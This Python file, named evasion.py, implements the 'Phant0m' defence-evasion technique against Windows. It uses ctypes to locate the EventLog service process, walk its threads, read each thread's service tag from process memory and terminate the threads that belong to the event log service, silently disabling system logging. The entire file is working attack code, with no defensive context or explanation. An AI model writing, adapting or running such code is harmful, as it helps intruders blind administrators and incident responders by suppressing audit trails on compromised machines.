# evasion.py

import ctypes
from ctypes import wintypes, Structure, POINTER, byref, sizeof

# Load necessary DLLs
advapi32 = ctypes.WinDLL('advapi32.dll')
kernel32 = ctypes.WinDLL('kernel32.dll')
ntdll = ctypes.WinDLL('ntdll.dll')

# Define necessary structures
class SERVICE_STATUS_PROCESS(Structure):
    _fields_ = [
        ("dwServiceType", wintypes.DWORD),
        ("dwCurrentState", wintypes.DWORD),
        ("dwControlsAccepted", wintypes.DWORD),
        ("dwWin32ExitCode", wintypes.DWORD),
        ("dwServiceSpecificExitCode", wintypes.DWORD),
        ("dwCheckPoint", wintypes.DWORD),
        ("dwWaitHint", wintypes.DWORD),
        ("dwProcessId", wintypes.DWORD),
        ("dwServiceFlags", wintypes.DWORD),
    ]

class THREADENTRY32(Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ThreadID", wintypes.DWORD),
        ("th32OwnerProcessID", wintypes.DWORD),
        ("tpBasePri", wintypes.LONG),
        ("tpDeltaPri", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
    ]

class PTHREAD_BASIC_INFORMATION(Structure):
    _fields_ = [
        ("exitStatus", wintypes.LONG),
        ("pTebBaseAddress", wintypes.LPVOID),
        ("clientId", wintypes.LPVOID),  # CLIENT_ID
        ("AffinityMask", wintypes.LPVOID),
        ("Priority", wintypes.LONG),
        ("BasePriority", wintypes.LONG),
        ("v", wintypes.LONG)
    ]

class SC_SERVICE_TAG_QUERY(Structure):
    _fields_ = [
        ("processId", wintypes.DWORD),
        ("serviceTag", wintypes.DWORD),
        ("reserved", wintypes.DWORD),
        ("pBuffer", wintypes.LPVOID)
    ]

# Define necessary functions
OpenSCManager = advapi32.OpenSCManagerW
OpenSCManager.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD]
OpenSCManager.restype = wintypes.HANDLE

OpenService = advapi32.OpenServiceW
OpenService.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.DWORD]
OpenService.restype = wintypes.HANDLE

QueryServiceStatusEx = advapi32.QueryServiceStatusEx
QueryServiceStatusEx.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, POINTER(wintypes.DWORD)]
QueryServiceStatusEx.restype = wintypes.BOOL

OpenThread = kernel32.OpenThread
OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenThread.restype = wintypes.HANDLE

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

TerminateThread = kernel32.TerminateThread
TerminateThread.argtypes = [wintypes.HANDLE, wintypes.DWORD]
TerminateThread.restype = wintypes.BOOL

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL

ReadProcessMemory = kernel32.ReadProcessMemory
ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
ReadProcessMemory.restype = wintypes.BOOL

CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
CreateToolhelp32Snapshot.restype = wintypes.HANDLE

Thread32First = kernel32.Thread32First
Thread32First.argtypes = [wintypes.HANDLE, POINTER(THREADENTRY32)]
Thread32First.restype = wintypes.BOOL

Thread32Next = kernel32.Thread32Next
Thread32Next.argtypes = [wintypes.HANDLE, POINTER(THREADENTRY32)]
Thread32Next.restype = wintypes.BOOL

NtQueryInformationThread = ntdll.NtQueryInformationThread
NtQueryInformationThread.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.ULONG, POINTER(wintypes.ULONG)]
NtQueryInformationThread.restype = wintypes.NTSTATUS

# Constants
SERVICE_QUERY_STATUS = 0x0004
SC_STATUS_PROCESS_INFO = 0
TH32CS_SNAPTHREAD = 0x00000004
THREAD_QUERY_LIMITED_INFORMATION = 0x0800
THREAD_SUSPEND_RESUME = 0x0002
THREAD_TERMINATE = 0x0001
PROCESS_VM_READ = 0x0010

def get_event_log_pid():
    scm = OpenSCManager(None, None, SERVICE_QUERY_STATUS)
    if not scm:
        raise Exception("Failed to open service manager")

    svc = OpenService(scm, "EventLog", SERVICE_QUERY_STATUS)
    if not svc:
        raise Exception("Failed to open service")

    ssp = SERVICE_STATUS_PROCESS()
    dwBytesNeeded = wintypes.DWORD()

    if not QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, byref(ssp), sizeof(ssp), byref(dwBytesNeeded)):
        raise Exception("Failed to query service status")

    return ssp.dwProcessId

def phant0m(eventlog_pid):
    hThreads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if hThreads == 0:
        raise Exception("Failed to create snapshot")

    te32 = THREADENTRY32()
    te32.dwSize = sizeof(THREADENTRY32)

    if not Thread32First(hThreads, byref(te32)):
        CloseHandle(hThreads)
        raise Exception("Failed to get first thread")

    while True:
        if te32.th32OwnerProcessID == eventlog_pid:
            hEvtThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_TERMINATE, False, te32.th32ThreadID)
            if hEvtThread == 0:
                CloseHandle(hThreads)
                raise Exception("Failed to open thread")

            tbi = PTHREAD_BASIC_INFORMATION()
            NtQueryInformationThread(hEvtThread, 0, byref(tbi), sizeof(tbi), None)

            hEvtProcess = OpenProcess(PROCESS_VM_READ, False, te32.th32OwnerProcessID)
            if hEvtProcess == 0:
                CloseHandle(hEvtThread)
                CloseHandle(hThreads)
                raise Exception("Failed to open process")

            if tbi.pTebBaseAddress:
                scTagQuery = SC_SERVICE_TAG_QUERY()
                hTag = ctypes.c_byte()
                pN = ctypes.c_void_p()

                ReadProcessMemory(hEvtProcess, tbi.pTebBaseAddress + 0x1720, byref(hTag), sizeof(pN), None)

                scTagQuery.processId = te32.th32OwnerProcessID
                scTagQuery.serviceTag = hTag.value

                I_QueryTagInformation = advapi32.I_QueryTagInformation
                I_QueryTagInformation.argtypes = [wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
                I_QueryTagInformation.restype = wintypes.LONG

                I_QueryTagInformation(None, 1, byref(scTagQuery))

                if scTagQuery.pBuffer:
                    TerminateThread(hEvtThread, 0)

                CloseHandle(hEvtThread)
                CloseHandle(hEvtProcess)

        if not Thread32Next(hThreads, byref(te32)):
            break

    CloseHandle(hThreads)

# Example usage
if __name__ == '__main__':
    try:
        eventlog_pid = get_event_log_pid()
        phant0m(eventlog_pid)
    except Exception as e:
        print(f"Error: {e}")
